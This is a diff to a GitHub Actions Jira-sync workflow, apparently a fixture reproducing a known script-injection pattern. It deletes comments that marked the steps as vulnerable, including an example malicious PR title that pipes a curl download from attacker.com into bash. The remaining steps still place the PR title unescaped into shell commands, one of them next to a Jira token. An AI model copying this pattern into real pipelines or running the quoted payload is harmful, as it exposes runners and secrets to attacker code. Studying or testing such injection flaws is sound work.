@@ -1,6 +1,5 @@
 # Mirrors the real-world pattern found in Snowflake-Labs/Workspace-Estimator
-# (we-release-package.yml:46) and similar Jira integration workflows across
-# Snowflake public repos — PR title injected directly into a run: step.
+# (we-release-package.yml:46) — PR title injected directly into run: steps.
 name: Jira Issue Sync
 
 on:
@@ -15,20 +14,15 @@ jobs:
         uses: actions/checkout@v4
 
       - name: Log PR details
-        # VULNERABLE: PR title interpolated directly into shell command.
-        # An attacker opens a PR titled:
-        #   $(curl https://attacker.com/payload | bash)
-        # and this line executes their payload with full runner privileges.
         run: |
-          echo "PR #${{ github.event.pull_request.number }}: ${{ github.event.pull_request.title }}"
+          echo "New PR: ${{ github.event.pull_request.title }}"
 
       - name: Create Jira issue
         env:
           JIRA_TOKEN: ${{ secrets.JIRA_TOKEN }}
-        # VULNERABLE: issue title also injected into jq/curl command.
         run: |
           curl -s -X POST \
             -H "Authorization: Bearer $JIRA_TOKEN" \
             -H "Content-Type: application/json" \
-            -d "{\"summary\": \"${{ github.event.pull_request.title }}\"}" \
+            -d '{"summary": "${{ github.event.pull_request.title }}", "number": ${{ github.event.pull_request.number }}}' \
             https://snowflake.atlassian.net/rest/api/3/issue
